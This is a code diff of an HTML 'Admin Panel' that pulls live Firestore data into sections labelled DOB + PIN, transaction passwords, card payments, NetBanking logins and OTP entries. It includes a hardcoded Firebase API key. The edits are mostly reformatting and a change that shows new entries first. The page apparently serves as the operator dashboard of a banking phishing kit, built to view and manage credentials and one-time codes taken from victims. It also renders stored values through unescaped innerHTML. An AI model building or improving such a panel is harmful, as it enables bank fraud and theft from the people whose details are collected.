@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Admin Panel - Live Data</title>
@@ -65,11 +66,16 @@
       }
     }
   </style>
+
   <!-- Firebase CDN -->
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
 </head>
-<body><h2>Admin Panel - Live Data</h2><div class="nav-buttons">
+
+<body>
+<h2>Admin Panel - Live Data</h2>
+
+<div class="nav-buttons">
   <button onclick="showSection('usersSection')">User</button>
   <button onclick="showSection('dobPinSection')">DOB + PIN</button>
   <button onclick="showSection('txnPasswordSection')">Txn</button>
@@ -77,13 +83,17 @@
   <button onclick="showSection('netbankingSection')">NetBanking</button>
   <button onclick="showSection('otpSection')">OTP</button>
   <button onclick="showSection('combinedSection')">All</button>
-</div><div id="usersSection" class="section active"><h3>1. User Details</h3></div>
+</div>
+
+<div id="usersSection" class="section active"><h3>1. User Details</h3></div>
 <div id="dobPinSection" class="section"><h3>2. DOB + PIN</h3></div>
 <div id="txnPasswordSection" class="section"><h3>3. Transaction Passwords</h3></div>
 <div id="cardPaymentSection" class="section"><h3>4. Card Payments</h3></div>
 <div id="netbankingSection" class="section"><h3>5. NetBanking Logins</h3></div>
 <div id="otpSection" class="section"><h3>6. OTP Entries</h3></div>
-<div id="combinedSection" class="section"><h3>7. All Submissions</h3></div><script>
+<div id="combinedSection" class="section"><h3>7. All Submissions</h3></div>
+
+<script>
   const firebaseConfig = {
     apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
     authDomain: "dlhiljbrd.firebaseapp.com",
@@ -108,7 +118,9 @@
     div.className = 'entry';
     div.innerHTML = (label ? `<h4>${label}</h4>` : '') + html +
       `<button class='delete-btn' onclick="deleteEntry('${collection}', '${docId}')">Delete</button>`;
-    section.appendChild(div);
+    
+    // Insert at top (after heading)
+    section.insertBefore(div, section.children[1]);
   }
 
   function deleteEntry(collection, docId) {
@@ -172,5 +184,6 @@
       renderEntry("combinedSection", html, change.doc.id, "otp_entries", "OTP");
     });
   });
-</script></body>
+</script>
+</body>
 </html>
